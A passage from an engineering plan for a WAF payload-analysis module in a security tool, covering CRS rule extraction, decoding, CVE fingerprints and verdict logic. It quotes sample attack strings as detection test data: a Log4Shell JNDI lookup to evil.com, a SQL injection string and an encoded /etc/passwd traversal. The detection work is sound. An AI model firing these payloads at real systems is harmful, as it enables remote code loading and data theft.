# Implementation Plan — WAF Payload Analysis

Source briefing: *WAF Payload Analysis Module* (2026-08-08).
Companions: [`process_analyzer.md`](process_analyzer.md) and
[`cmdline_analyzer.md`](cmdline_analyzer.md) — the two sibling modules,
both already shipped. This document translates the briefing into concrete changes
against the current codebase, records every decision it left open, and states
seven deliberate deviations from it.

**Out of scope** (per briefing §10): wiring `aggregated_verdict` /
`crs_anomaly_score` into [`ioc/confidence_scorer.py`](../ioc/confidence_scorer.py),
expanding the CVE fingerprint set beyond a curated launch list, and any live
ModSecurity/Coraza engine integration.

---

## 0. Current State

Unlike the two sibling modules, **nothing exists yet** — there is no WAF field,
no placeholder, no passthrough. The briefing's design choice (§2) is that WAF
payloads arrive through the **existing main IOC textarea**
([`app.py:776`](../app.py#L776)), parsed by
[`parse_iocs`](../ioc/parser.py#L109) at [`app.py:962`](../app.py#L962).

That single choice is what makes this module structurally different from its
siblings. Process and Command Line results never touch the IOC pipeline: they
live in their own `run_results` keys and their own row list
([`app.py:1254`](../app.py#L1254)). A WAF payload, arriving through the main box,
lands inside `parsed_input_items` by construction — so it will flow into
[`summarize_results`](../ioc/verdict.py#L47) and into provider dispatch unless
deliberately routed away. See D6, which is the single highest-risk integration
point in this plan.

### Answers to briefing §11

1. **libinjection binding maintenance — verified, and it fails.** See D1. The
   answer changes the shape of Layer 2 entirely.
2. **Layer 1 decoder sharing — share, after an extraction.** See D2. Scopes
   overlap enough to justify it, but three of the cmdline decoder's settings are
   wrong for web payloads and must become parameters.
3. **CRS anomaly threshold — cannot be set up front.** Deferred to a calibration
   corpus, same method the sibling modules used. See §6 Milestone C.
4. **Providers UI framing — no.** See D7. The provider list is wired to network
   dispatch and timing; local matchers do not belong in it.
5. **Bulk volume — non-issue, measured.**
   [`sigma_cmdline_patterns.json`](../core/data/sigma_cmdline_patterns.json)
   already carries **1409 patterns (1.2 MB)** matched on every run with no
   perceptible cost. The CRS subset will be smaller by roughly an order of
   magnitude. No performance work planned.

---

## 1. Architecture Decisions

### D1 — libinjection is rejected. CRS covers SQLi and XSS instead.

**Rejected: `pylibinjection`** (briefing §3 Layer 2). Verified against PyPI on
2026-08-11; version 0.2.4 is current. Three independent objections, any one of
which is sufficient:

1. **Source distribution only — no wheels.** `pip download pylibinjection`
   yields `pylibinjection-0.2.4.tar.gz` containing `src/pylibinjection.pyx` and a
   bundled C submodule. Installing it requires a C toolchain (MSVC Build Tools on
   Windows). [`requirements.txt`](../requirements.txt) is four pure-Python lines,
   and [`cmdline_analyzer.md`](cmdline_analyzer.md) D1 already rejected
   a dependency on exactly this portability ground. Reversing that for this
   module would be inconsistent.
2. **No XSS support at all.** The bundled submodule ships only
   `libinjection_sqli.c` / `libinjection_sqli_data.h` — there is no
   `libinjection_html5.c` and no `libinjection_xss.c`. The wrapper exposes a
   single function, `detect_sqli()`. The briefing's `xss_match` field (§4) is
   **not obtainable** from this binding. This is not a version or maintenance
   issue that a newer release would fix; the XSS module was never wrapped.
3. **Licence conflict.** `pylibinjection` is GPL-2.0-or-later. This project is
   MIT ([`LICENSE:1`](../LICENSE#L1)). Linking a GPL library into it is a
   licensing decision well beyond the scope of a detection layer.

**Decision:** drop Layer 2 as a separate layer. SQLi and XSS are detected through
the same CRS extraction pipeline as everything else, which means **keeping CRS
rule ranges `941xxx` (XSS) and `942xxx` (SQLi)** — the two ranges briefing §3
Layer 3 explicitly told us to skip, on the assumption libinjection would cover
them better.

This is a real capability loss and should be stated plainly rather than papered
over: CRS's SQLi rules are regex-based, so they are more evadable than
libinjection's token-based fingerprinting against tricks like comment insertion
and case mixing. The mitigation is Layer 1 — payloads are decoded and normalised
before matching, which removes the most common encoding-based evasions — and the
conservative aggregation in §4, which never treats a single regex hit as
conclusive anyway.

**If this is ever revisited**, the objection to overturn is #2, not #1. A binding
that wraps `libinjection_xss` and ships wheels would be worth reopening the
portability question for. Do not reopen it for a SQLi-only binding.

### D2 — Layer 1 decoder is shared, via extraction, not by importing as-is.

Briefing §3 Layer 1 asks whether to share the cmdline decoder. Answer: **yes**,
but [`cmdline_deobfuscator.py`](../core/cmdline_deobfuscator.py) cannot be called
directly, because three of its calibration choices are correct for Windows
command lines and wrong for web payloads:

| Setting | Current value | Why it breaks on WAF payloads |
|---|---|---|
| [`_MIN_ENCODING_HITS = 2`](../core/cmdline_deobfuscator.py#L61) | 2 occurrences required | A payload often carries exactly one encoded character — `%27` for a quote, `..%2f` for traversal. The threshold exists to stop `%SystemRoot%` being read as percent-encoding; that rationale has no web analogue. |
| [UTF-16LE tried first](../core/cmdline_deobfuscator.py#L147-L148) | when NULs present | Specific to PowerShell `-EncodedCommand`. Web payloads are UTF-8. |
| [`MIN_B64_INLINE = 24`](../core/cmdline_deobfuscator.py#L50) + [command-shape gate](../core/cmdline_deobfuscator.py#L156-L159) | ≥24 chars, ≥2 command markers | Base64 in a web payload is frequently shorter and does not look like a command line. |

**Decision:** extract the interpreter-agnostic transforms — percent-encoding,
numeric HTML entities, `\uXXXX`/`\xNN` escapes, base64, and the fixed-point
iteration loop with its `MAX_DECODE_ROUNDS` / `MAX_DECODED_BYTES` caps — into
`core/decode_common.py`, parameterised by a small profile object. The
PowerShell-specific folds (backticks, `[char]`, `[char[]]`, the `-f` format
operator, `-enc` flag handling) stay in `cmdline_deobfuscator.py` and are not
offered to this module.

**Hard constraint: the shipped Command Line module must not change behaviour.**
Its existing test suite ([`test_cmdline_deobfuscator.py`](../tests/test_cmdline_deobfuscator.py),
[`test_cmdline_calibration.py`](../tests/test_cmdline_calibration.py)) is the
regression gate; the extraction is complete only when both pass unmodified.

The `decode_chain` provenance list is kept verbatim — the reason it exists there
applies identically here. A decoded payload an analyst cannot trace back to its
source is worse than no decode at all.

### D3 — CRS extraction is Option A with provenance, mirroring the Sigma work.

CRS is a rule set, not a library, exactly as Sigma was. The established pattern
is [`extract_sigma_cmdline_patterns.py`](../core/scripts/extract_sigma_cmdline_patterns.py)
→ `core/data/*.json`, run offline, never evaluated at runtime, with PyYAML kept
as a script-only dependency out of `requirements.txt`. This module follows it
exactly.

CRS rules are ModSecurity SecLang, which carries three complications Sigma did
not:

1. **Operators that are not regexes.** `@detectSQLi` and `@detectXSS` *are*
   libinjection embedded inside ModSecurity — these rules cannot be extracted as
   patterns at all and must be dropped, recorded, and counted. `@pmFromFile`
   references external `.data` word lists that have to be fetched alongside the
   rules and inlined as alternations.
2. **Transformation chains.** `t:urlDecodeUni,t:lowercase,t:removeComments`
   determines what the pattern is actually matched against. A rule extracted
   without its transformations will silently under-match. Where a transformation
   has no equivalent in our Layer 1 output, the rule is dropped rather than
   shipped in a weakened form.
3. **PCRE constructs Python `re` lacks** — possessive quantifiers, atomic groups,
   recursion. Every extracted pattern must be `re.compile`-verified inside the
   extractor. A pattern that fails to compile is dropped and recorded, never
   emitted.

**Decision:** the extractor emits, per rule, `{rule_id, category, pattern,
severity_weight, targets, transformations, dropped_conditions}` — the same
`dropped_conditions` provenance field that
[`_dropped_conditions()`](../core/cmdline_analyzer.py#L389) already establishes
for Sigma, and for the same reason: a partially-extracted rule that presents
itself as complete will produce confident wrong answers. The `_meta` block
records total rules seen, extracted, and dropped by cause.

### D4 — Layer 4 needs a new NVD fetch. Briefing §3 Layer 4 is factually wrong.

The briefing states a CVE fingerprint match should "cross-reference the CVE ID
into the existing NVD+KEV panel — reuse that pipeline entirely, no new CVE data
source needed."

That is not what the panel does.
[`ui/components/cve_panel.py`](../ui/components/cve_panel.py) fetches CVEs **by
publication-date window only** —
[`_fetch_nvd_page(pub_start, pub_end, start_index)`](../ui/components/cve_panel.py#L679)
driven by [`_time_window(hours)`](../ui/components/cve_panel.py#L719), defaulting
to [the last 3 hours](../ui/components/cve_panel.py#L793). There is no
lookup-by-CVE-ID path anywhere in the module. Every CVE this layer can possibly
match is years old by definition — the fingerprints are curated *because* the
CVEs are mass-exploited and well documented. Log4Shell will never appear in a
"last 3 hours" window.

**Decision:** add one function, `fetch_cve_by_id(cve_id)`, calling
`NVD_CVE_URL` with the `cveId` parameter. It reuses the module's existing API-key
handling, its `_parse_nvd_item` parser, and — unchanged — its
[`_fetch_kev_data()`](../ui/components/cve_panel.py#L623), which already returns
the full CISA KEV catalogue keyed by CVE ID and so answers "is this
known-exploited?" for free.

Scope discipline: this is a lookup helper for the WAF module, not a new CVE
browsing feature. The panel's own UI is not touched.

**Failure mode is explicit.** A fingerprint match is a local, offline result. If
the NVD call fails or times out, the match still stands and still drives the
verdict; the enrichment (CVSS, KEV status, description) is simply absent and
labelled as such. The verdict must never depend on a network call succeeding.

### D5 — Delimiter-only detection at launch. The payload-only fallback is deferred.

Briefing §2.1 claim 1 is **correct and verified**: every existing detector in
[`ioc/parser.py:11-25`](../ioc/parser.py#L11-L25) is anchored `^…$`, so no line
containing ` | ` can match any of them. Layering the delimiter trigger in is
genuinely safe.

Briefing §2.1 step 4 — the payload-only fallback — is not.
[`SCHEMELESS_URL_RE`](../ioc/parser.py#L25) matches host-plus-path lines, so
`example.com/login?id=1' OR '1'='1` is classified `url` at
[`parser.py:102`](../ioc/parser.py#L102) before any WAF check runs. Ordering the
WAF check last (as the briefing specifies) does not help — the URL detector wins,
and correctly so from its own point of view. Reordering to let WAF win would put
every URL containing a quote or angle bracket at risk of being reclassified.

**Decision:** v1 requires the ` | ` delimiter. A payload-only line is not
detected as a WAF payload. The validation gate from briefing §2.1 step 3 is kept
and applied *after* splitting: if the right-hand side contains none of the
attack-characteristic markers, the line is not treated as a WAF payload.

This is a deliberate under-reach. Promoting the fallback later is cheap and can
be decided on real usage; unpicking a misclassified URL corpus is not.

**The briefing's marker list is wrong and is corrected here (found in A2).**
§2.1 step 3 lists only URL-encoding, HTML/script, SQL characters and path
traversal. Check that against the briefing's own worked example, one section
earlier:

```
/api/data | ${jndi:ldap://evil.com/a}
```

`${jndi:ldap://evil.com/a}` contains no percent sequence, no angle bracket, no
quote, no `--`, no `;` and no `../`. The briefing's gate **rejects Log4Shell** —
the flagship case for the entire CVE fingerprint layer — before analysis begins,
and the module would have shipped unable to detect the one payload every reader
would test it with first.

Three marker groups are added, and the Log4Shell string is pinned as a
regression test in `test_waf_payload_parser.py`:

| Marker | Pattern | Covers |
|---|---|---|
| `expression-injection` | `[$#%]\{` | Log4Shell (JNDI), Spring EL, OGNL |
| `command-substitution` | `\$\(` or backtick | shell injection without `;` |
| `null-byte` | `%00` or a literal NUL | extension-check bypass |

One marker is also **tightened**: the briefing reads a bare `%` as a URL-encoding
marker, which classifies `CPU | 95% load average` as a payload. It requires
`%XX` here.

Two consequences worth stating, both pinned by tests:

- An **encoded** traversal payload (`%2e%2e%2fetc%2fpasswd`) fires
  `url-encoding`, not `path-traversal` — the literal `../` only exists after the
  Layer 1 decode, which runs downstream of this gate. The encoding marker admits
  the line, which is sufficient; the gate does not need to be right about *which*
  attack it is.
- An **empty payload** after splitting is kept rather than refused. The
  delimiter is the analyst stating intent, and returning "not a WAF payload"
  would make `parse_iocs` discard the line silently (D6). It reaches the
  analyzer and surfaces as `Unknown` per §4 rule 6.

### D6 — WAF payloads must be routed out of the IOC pipeline. Highest-risk step.

[`summarize_results`](../ioc/verdict.py#L47) iterates **every** entry in `items`,
emits one row each, and counts each into `summary["total"]`. A `waf_payload` item
reaching it produces a row with no provider data — verdict `Unknown`, empty
evidence — and inflates the session counts that
[`compute_session_summary`](../ioc/confidence_scorer.py) feeds. The IOC cards and
the Table renderer both assume one row per atomic IOC.

The sibling modules never hit this because their findings never enter `items`.
This module's do, by construction (§0).

**Decision:** `parse_iocs` returns WAF payloads as a distinct type; `app.py`
partitions them out of `items` **before** provider dispatch and before
`summarize_results`, into their own `run_results["waf_rows"]` /
`run_results["waf_analysis"]` keys, following the `process_rows` precedent
([`app.py:1254`](../app.py#L1254)).

Two things are already safe and need no work, both verified:

- **Provider dispatch.** [`_IOC_TYPE_TO_GROUP`](../app.py#L480) has no entry for
  a new type, so `_auto_allowed_by_type` resolves an empty provider set and
  `_manual_allowed_by_type` likewise. No API call can fire for a WAF payload even
  if one leaks through. This matters for more than tidiness: it means an
  attacker-supplied payload cannot be forwarded to an external service.
- **Row schema.** [`cmdline_analyzer._row`](../core/cmdline_analyzer.py#L945)
  already establishes the exact key set, including the `ConfidenceScore` family
  set to `None` / `""` rather than omitted — omitting them produces ragged
  columns that pyarrow cannot convert, breaking the Table render for the whole
  run. Copy it key-for-key, with a test asserting parity, as the cmdline module
  does.

**Not attempted: briefing §5.6's "route to manual review".**
[`parse_iocs` silently discards](../ioc/parser.py#L126-L127) any line
`_detect_type` cannot classify, and no UI surface for unparsed lines exists.
Building one means changing the `parse_iocs` return contract, which touches every
caller. Out of scope here; recorded in §7.

### D7 — No pseudo-providers in the provider list. Answers briefing §11.4: no.

[`_PROVIDER_KEYS`](../app.py#L1015) is wired straight into `_payload()`,
`provider_flags`, and the `_timed()` timing dictionary, all of which assume a
network call returning a dict keyed by IOC value. A local matcher satisfies none
of those assumptions, and adding one means special-casing three call sites to
keep the timing popup and the provider checkboxes honest.

**Decision:** do not. Label the origin in the Sources column instead — the
cmdline module already writes `"Local (keyword table)"`
([`cmdline_analyzer.py:1030`](../core/cmdline_analyzer.py#L1030)). This module
writes `"Local (OWASP CRS)"` or `"Local (CVE fingerprint)"` per row. Same
visibility, zero coupling to the network path.

### D8 — Flag naming: use the explicit map, and note what substring matching already does.

[`flags_summary_for_evidence()`](../ioc/flags/__init__.py#L192) contains:

```python
if any(k in fid for k in ("EXPLOIT", "SQLI", "WEBATTACK", "CVE")):
    ev["exploit_attempt"] = True
```

The briefing's proposed flag names collide with this **favourably but
inconsistently**: `SQLI_MATCH` and `CVE_FINGERPRINT_*` would map to
`exploit_attempt` automatically, while `XSS_MATCH`, `CRS_LFI_MATCH` and
`CRS_RCE_MATCH` would not — leaving cross-site scripting and remote code
execution contributing *no* evidence to the Threat Analysis narrative while SQL
injection does. That asymmetry is an artefact, not a judgement.

**Decision:** follow the cmdline module's precedent
([`_CMDLINE_EVIDENCE`](../ioc/flags/__init__.py#L111), matched on exact id at
[`__init__.py:225-226`](../ioc/flags/__init__.py#L225-L226)) and add a `_WAF_EVIDENCE`
map keyed on exact flag id, so every category maps deliberately. Flags are
prefixed `WAF_`.

| Flag ID | Severity | Evidence key |
|---|---|---|
| `WAF_CVE_FINGERPRINT` | CRITICAL | `exploit_attempt` |
| `WAF_SQLI_MATCH` | HIGH | `exploit_attempt` |
| `WAF_XSS_MATCH` | HIGH | `exploit_attempt` |
| `WAF_RCE_MATCH` | HIGH | `exploit_attempt` |
| `WAF_LFI_MATCH` | MEDIUM | `exploit_attempt` |
| `WAF_TRAVERSAL_MATCH` | MEDIUM | `exploit_attempt` |
| `WAF_SSRF_MATCH` | MEDIUM | `exploit_attempt` |
| `WAF_PROTOCOL_ANOMALY` | LOW | *(none)* |
| `WAF_ENCODED_PAYLOAD` | INFO | *(none — annotate only)* |

The CVE ID goes in the flag's `detail` field, **not** the id — a flag id that
varies per CVE cannot be put in a frozenset map, and would defeat the
deduplication in `extract_ioc_flags`. This is a deviation from briefing §7's
`CVE_FINGERPRINT_<CVE_ID>` naming, made for that reason.

`WAF_ENCODED_PAYLOAD` maps to nothing, ever. Encoding is an evasion signal, not
proof of an attack — the same call the cmdline module made for
`CMDLINE_ENCODED_PAYLOAD`.

### D9 — `Benign` is never returned. Deviation from briefing §5.5.

Briefing §5.5 routes "nothing matched anywhere" to `Benign`. Both sibling modules
refuse to ([`cmdline_analyzer.md`](cmdline_analyzer.md) D10), and
[`ioc/verdict.py:169`](../ioc/verdict.py#L169) hardcodes `summary["benign"] = 0`
for the whole app.

The argument is stronger here than for either sibling. These lines reach the tool
*because a WAF already flagged them*. "Our local rule subset did not match" is a
statement about our extracted CRS subset, not about the request. Calling that
`Benign` would tell an analyst the opposite of what the evidence supports.

**Decision:** floor is `Unknown`. Three outcomes collapse into it — clean parse
with no match (§5.5), decode failure (§5.6), and empty payload after splitting —
so the result carries `parse_ok: bool` and `decode_ok: bool` to keep them
distinguishable in the UI and the narrative.

### D10 — One rule match is never `Malicious`, and the CVE exception is explicit.

Briefing §5 closes with a design note that deserves to be a constant, not a
comment: treating "1 rule matched" as sufficient for `Malicious` is the primary
cause of WAF alert fatigue, and building it in would undercut the tool's purpose.

This is also where the module meets the project rule requiring corroboration from
a minimum of two sources before a final verdict. §5 rule 1 — a CVE fingerprint
match alone reaching `Malicious` — is a single-source `Malicious` and therefore an
exception that must be declared, not assumed.

**Decision:** mirror the cmdline module's
[`MALICIOUS_REQUIRES_CORROBORATION`](../core/cmdline_analyzer.py#L104) constant
and its explicit exception list. The CVE fingerprint layer is the **only**
declared exception, justified by the fingerprints being curated to be specific
rather than generic — `${jndi:ldap://` is not a string that appears in ordinary
traffic. Every other path to `Malicious` requires two independent layers.

The fingerprint dictionary is the load-bearing assumption behind that exception,
which sets the bar for adding entries: a candidate pattern that could plausibly
occur in legitimate traffic does not belong in the file, however well known its
CVE. This constrains growth deliberately — see §7.

---

## 2. File Layout

```
core/
  waf_payload_analyzer.py                # Layers 2-4 + aggregation + flags + rows
  waf_payload_parser.py                  # line split + validation gate (D5)
  decode_common.py                       # shared generic decoder (D2)
  cmdline_deobfuscator.py                # reduced to PowerShell-specific folds (D2)
  data/
    crs_patterns.json                    # Layer 3 extracted subset (D3)
    cve_fingerprints.json                # Layer 4 curated dictionary
  scripts/
    extract_crs_patterns.py              # offline, sibling of extract_sigma_cmdline_patterns.py
ui/components/
  cve_panel.py                           # + fetch_cve_by_id() (D4)
tests/
  test_decode_common.py
  test_waf_payload_parser.py
  test_waf_payload_analyzer.py
  test_waf_payload_integration.py
  test_waf_payload_calibration.py
```

The briefing put all four layers in one file. The line parser is split out for
the same reason the cmdline tokenizer was: it is the piece the auto-detect
cascade depends on, it carries the densest test suite, and it must be importable
by [`ioc/parser.py`](../ioc/parser.py) without dragging the datasets in.

**No new runtime dependency.** PyYAML stays script-only.

---

## 3. Data Model

```python
@dataclass
class WafPayloadInput:
    raw_line: str                   # full line as submitted, kept for audit/display
    path: str | None                # left of the delimiter
    payload: str                    # right of the delimiter

@dataclass
class CrsMatch:
    rule_id: str
    category: str                   # sqli | xss | rce | lfi | traversal | ssrf | protocol
    severity_weight: float
    dropped_conditions: list[str]   # D3 — empty means the rule was extracted whole

@dataclass
class WafPayloadAnalysisResult:
    path: str | None
    raw_payload: str
    decoded_payload: str
    was_encoded: bool
    decode_chain: list[str]         # D2 — provenance, not decoration
    decode_ok: bool                 # D9
    parse_ok: bool                  # D9
    crs_matches: list[CrsMatch]
    crs_anomaly_score: float
    cve_fingerprint_match: dict | None      # {cve, name, nvd: dict | None, kev: bool | None}
    aggregated_verdict: str
    flags: list[dict]               # _flag()-shaped, feeds the existing system
```

`sqli_match` / `xss_match` from briefing §4 are **removed**. With D1 they are no
longer produced by a separate engine; they are two categories inside
`crs_matches` like any other, and keeping them as top-level booleans would imply
a distinct provenance that no longer exists.

`cve_fingerprint_match.nvd` and `.kev` are nullable on purpose (D4): `None` means
the enrichment call did not complete, which the UI must render as "not retrieved"
rather than "not known-exploited".

---

## 4. Verdict Aggregation

Briefing §5 order of precedence, with D9's floor and D10's constant:

1. **CVE fingerprint match** → `Malicious`. The sole declared exception to
   `MALICIOUS_REQUIRES_CORROBORATION` (D10). Independent of every other layer — a
   JNDI string is neither SQLi- nor XSS-shaped and will not trip CRS.
2. **CRS match in a high-severity category** (`sqli`, `xss`, `rce`) →
   `Suspicious`; escalates to `Malicious` only with a second independent signal:
   `crs_anomaly_score` above threshold, **or** `was_encoded = True` (legitimate
   traffic rarely arrives pre-encoded).
3. **`crs_anomaly_score` above threshold with no high-severity category match**
   → `Suspicious`, never `Malicious`. CRS's own paranoia-level model exists
   because score-only decisions produce too many false positives.
4. **Single low-weight CRS match, low score, not encoded** → `Unknown`. This is
   briefing §5.4's "user typed something innocuous containing a flagged
   character" case, and getting it wrong is how the tool becomes noise.
5. **Nothing matched** → `Unknown` (D9, not `Benign`), `parse_ok = True`.
6. **Decode failed, or payload empty after splitting** → `Unknown`, with
   `decode_ok` / `parse_ok` distinguishing which.

**The threshold in rules 2-4 is not set in this document.** Picking a number
before measuring is how the sibling modules ended up with the calibration
unknowns in their §7. It is derived in Milestone C against the corpus, and until
then Milestone B ships with the score displayed but not escalating.

**No cross-reference to the sibling modules.** A WAF payload and a process event
are different observations of possibly unrelated things; the process module's
cross-reference works because a command line and its parent process are the same
event by construction. Nothing equivalent holds here, and inventing a link would
manufacture correlation the data does not support.

---

## 5. Integration Points

**`ioc/parser.py`** — a `waf_payload` type, detected only via the ` | ` delimiter
plus the validation gate (D5), placed last in `_detect_type`. The `IOC` dataclass
([`parser.py:33`](../ioc/parser.py#L33)) gains one optional field to carry the
split, defaulted so no existing construction site changes.

**`app.py`** — partition before dispatch (D6):

```python
_waf_items = [i for i in parsed_input_items if i.type == "waf_payload"]
items = [i for i in parsed_input_items if i.type != "waf_payload"]
_waf_results = [analyze_waf_payload(w) for w in _waf_items]
```

placed alongside the existing `analyze_process_event` / `analyze_command_line`
calls ([`app.py:1109`](../app.py#L1109), [`app.py:1123`](../app.py#L1123)). It
takes no input from either and passes nothing to them.

**Rows** — `run_results["waf_rows"]`, identical column schema to `process_rows`,
with a parity test. One row per line, which is the natural fit briefing §7 notes:
unlike the process module, a WAF payload maps 1:1 to a row.

**Flags** — `run_results["waf_flags"]`, concatenated into the event-flag list at
[`ai_panel.py:619`](../ui/components/ai_panel.py#L619) beside `process_flags` and
`cmdline_flags`, plus the `_WAF_EVIDENCE` map from D8.

**AI narrative** — the decoded payload, `decode_chain`, matched categories and
CVE, following the pattern at
[`ai_panel.py:369-392`](../ui/components/ai_panel.py#L369-L392). The existing
"Checks skipped" convention applies: state when no WAF payload was supplied, so
the model does not imply certainty.

**JSON output** — `payload["waf_analysis"]`, beside the two existing blocks at
[`output_renderer.py:330-333`](../ui/components/output_renderer.py#L330-L333).

**A payload is never submitted anywhere.** D6 establishes this holds by default
through the empty provider set, and the URL-derivation path that the cmdline
module needed has no analogue here — indicators are not extracted from decoded
payloads for enrichment. If that is ever added, the cmdline module's
`_derived_submit_blocked` treatment is the precedent to follow.

---

## 6. Build Order

Three milestones, each independently mergeable and independently useful,
following the cmdline module's approach rather than the process module's
all-at-once landing. Milestone A reaches the UI before any dataset exists, so the
thresholds in B and C are tuned against observed behaviour instead of guessed.

### Milestone A — parse, decode, display

| # | Step | Depends on | Status |
|---|---|---|---|
| A1 | `decode_common.py` extraction; cmdline tests pass unmodified (D2) | — | **done** |
| A2 | `waf_payload_parser.py` — split, validation gate, tests (D5) | — | **done** |
| A3 | `ioc/parser.py` detection + `app.py` partition (D5, D6) | A2 | **done** |
| A4 | Result object, `to_rows`, `WAF_ENCODED_PAYLOAD` flag, JSON block | A1, A3 | **done** |

Ships a working decode-and-display path: paste a payload, see it decoded with its
chain, get an `Unknown` verdict. Useful on its own — decoding is the step
analysts do by hand today.

**A1 notes.** The extraction cost the command-line module nothing: its suite
passed unmodified and its calibration held at 30/30 detection, 0% false
positives. One pre-existing defect surfaced and is recorded in §7 (the UTF-16LE
fallback rescuing low-byte binary). `generic_transforms()` was written and then
removed — with only one consumer it was dead code, and composing the transform
tuple explicitly in each module keeps the ordering visible where it is used.

**A3 notes.** Two things D6 asserts are now tested rather than assumed: that a
payload never reaches `summarize_results`, and that its type resolves to no
provider group. The second is currently true by omission, so the test reads
`app.py`'s source — crude, but it fails loudly if someone adds a mapping without
revisiting D6.

Two integration decisions were forced by running real batches through
`parse_iocs`, neither anticipated in this document:

- **`waf_payload` is exempt from the manual-mode type filter.** That filter is
  driven by the IOC-group checkboxes, which exist to stop unwanted provider
  calls. A payload makes none and has no checkbox, so filtering it there would
  drop the line with no way to opt back in.
- **The empty-payload branch (D5) was unreachable as first written.**
  `parse_iocs` strips every line before typing it, so `"/login?user= | "` arrives
  as `"/login?user= |"` and the space-pipe-space match fails. The unit test
  passed on input the app could never produce. The parser now also accepts the
  stripped trailing form, and an integration test covers the path end to end —
  the general lesson being that a unit test for this module proves nothing about
  reachability until a batch has gone through `parse_iocs`.

**A4 notes.** Milestone A is complete and reaches the UI: table row, JSON block,
flag, and AI narrative context.

Two decisions were added to what this document specified:

- **`checks_skipped`, not an empty `crs_matches`.** The result object carries the
  CRS and CVE fields from Milestone A so the JSON shape stays stable across
  milestones — but an empty `crs_matches` reads as "CRS ran and found nothing",
  which is exactly the false reassurance §5 is written against. Every result now
  lists the checks that did not run, reusing the convention the process module
  established, and the AI prompt states outright that `Unknown` here means
  matching is unimplemented rather than assessed-and-cleared.
- **No `aggregate_verdict()` function yet.** §4 rules 1-4 all read the CRS and
  CVE layers, so at this milestone only rules 5 and 6 are reachable and both
  resolve to `Unknown`. Writing the full ladder now would mean branches no test
  could exercise against fields nothing can populate; the verdict is set inline
  with a comment, and the ladder lands with the layers that feed it in B2.

`WEB_PROFILE.min_b64_inline = 20` is the one uncalibrated number introduced here.
It is safe to be wrong about in Milestone A — nothing escalates a verdict, so a
bad decode shows the analyst noise with its provenance attached rather than
manufacturing a finding — but it needs measuring against the Milestone C corpus.

A canonical `mitre_url()` now lives in [`ioc/flags/base.py`](../ioc/flags/base.py),
which already owns `_flag()`. `core/process_analyzer.py` and
`core/cmdline_analyzer.py` each carry a byte-identical private copy; folding
those two into it was deliberately left out of this change so the shipped
modules stayed untouched, and is a clean standalone follow-up.

### Milestone B — CRS matching

| # | Step | Depends on | Status |
|---|---|---|---|
| B1 | `extract_crs_patterns.py` + `crs_patterns.json` (D3) | — | **done** |
| B2 | Category matching + anomaly score, displayed, **not escalating** | A4, B1 | **done** |
| B3 | Category flags + `_WAF_EVIDENCE` map (D8) | B2 | — |

B1 is the largest single piece of work and its uncertainty is concentrated in the
`dropped_conditions` count: if a large share of the target rule ranges drop out
to `@detectSQLi`, `@pmFromFile` or PCRE incompatibility, the layer's coverage is
materially thinner than the briefing assumes. **Measure and report that number
before building B2** — it may change the plan.

#### B1 measured yield (CRS 4.29.0-dev, 2026-08-11)

> **Corrected during B2.** The first version of this section reported 197 rules
> and a 98% yield. That figure was wrong: the extractor was emitting the *head*
> of every chained rule as though it were a complete rule. Chained rules are now
> dropped, and the corrected numbers are below. The defect and how it surfaced
> are written up under B2.

**The plan does not change. D1 holds.**

291 `SecRule` statements across the eight target files:

| Outcome | Count | Note |
|---|---|---|
| Extracted as regex | 171 | |
| Extracted as phrase lists | 12 | `@pmFromFile` / `@pm` |
| Skipped — control flow | 66 | paranoia gating, `skipAfter`; never detection |
| Skipped — chain continuation | 14 | sub-rules of a dropped chain |
| Skipped — non-pattern operator | 3 | `@gt` ×2, `@contains` ×1 |
| **Dropped — chained rule** | **21** | head pattern is a precondition, not a detection |
| **Dropped — libinjection** | **4** | `@detectSQLi` ×2, `@detectXSS` ×2 |
| Dropped — uncompilable | **0** | |

**183 of the 211 extractable detection rules survive — 87%.** The capability
loss is 21 chained rules plus the 4 libinjection rules D1 already accounted for.

By category: `sqli` 53, `rce` 42, `xss` 29, `php` 20, `protocol` 15, `ssrf` 14,
`lfi` 6, `rfi` 4.

**D1's load-bearing assumption is confirmed by measurement.** Dropping
libinjection costs 4 rules and buys 88 regex-based SQLi and XSS rules that the
briefing's plan would have skipped. The trade is far better than D1 claimed
when it was written on argument alone.

**Two rule files were added to D3's list** — `931` (RFI) and `934` (SSRF). Both
are named in briefing §3 Layer 3; D3's shorter range list dropped them, which
looks like an oversight rather than a decision. They contribute 19 rules.

**PCRE translation: 9 patterns needed it, all 9 recovered, 0 dropped.** This is
where the milestone nearly went wrong. Eight patterns fail Python's `re` on
`\x{hh}` and one on `\z`, and the obvious fix — padding the bare `\x` to `\x00`
— **compiles cleanly and silently changes what the rule matches**: `\x{bc}`
becomes `\x00{bc}`, and rule 941310 stops matching the `¼`-obfuscated tag it
exists to catch. The correct translation (`\x{bc}` → `\xbc`) is in
`pcre_to_python`, and a test asserts both that it matches and that the naive
version does not, so the trap cannot be walked into again.

#### The real gap is transformations, not extraction

74 of 197 rules carry a non-empty `dropped_conditions`:

| Cause | Rules |
|---|---|
| Unsupported transformation | 61 |
| Target mismatch (headers/cookies only) | 16 |

Broken down, the transformations CRS asks for and Layer 1 does not do: `jsDecode`
28, `cssDecode` 20, `cmdLine` 13, `replaceComments` 9, `removeWhitespace` 8,
`escapeSeqDecode` 7, `removeCommentsChar` 1.

These rules will **under-match** until B2 addresses them — an XSS rule expecting
JavaScript escapes decoded will miss a payload that uses them. That is the
honest state of the layer, and it concentrates in exactly the two categories D1
made CRS responsible for.

Most are cheap: `removeWhitespace`, `replaceComments` and `escapeSeqDecode` are
small pure functions, and `cmdLine` is a documented ModSecurity normalisation.
`jsDecode` and `cssDecode` are the two worth real care. **B2 should implement the
transformation chain before tuning any threshold** — measuring an anomaly score
against rules that are under-matching by construction would calibrate to the
wrong number.

#### B2 notes

All 18 transformations the rule set asks for are implemented in
[`core/crs_transforms.py`](../core/crs_transforms.py), so no extracted rule is
now matched against text it did not expect. Matching lives in
[`core/crs_matcher.py`](../core/crs_matcher.py) rather than inside the analyzer —
a deviation from §2's file layout, made because the loader, the transformation
cache and the scan loop are a unit with their own test surface, exactly as the
command-line tokenizer was.

**The transformations are not built on `decode_common`, on purpose.** The two
modules have opposite obligations: `decode_common` refuses to percent-decode a
lone `%27` and skips named HTML entities, because those heuristics protect the
command-line module from corrupting `%SystemRoot%` and `dir&copy a b`.
ModSecurity has no such reservations. Reusing the gated versions would have
under-transformed silently — the same failure the missing transformations
already caused.

**The chained-rule defect.** Three benign strings were scoring during the first
smoke test, and `report q3` was one of them. The cause was CRS rule 932205,
whose own pattern is `^[^#]+` against the Referer header — it matches nearly any
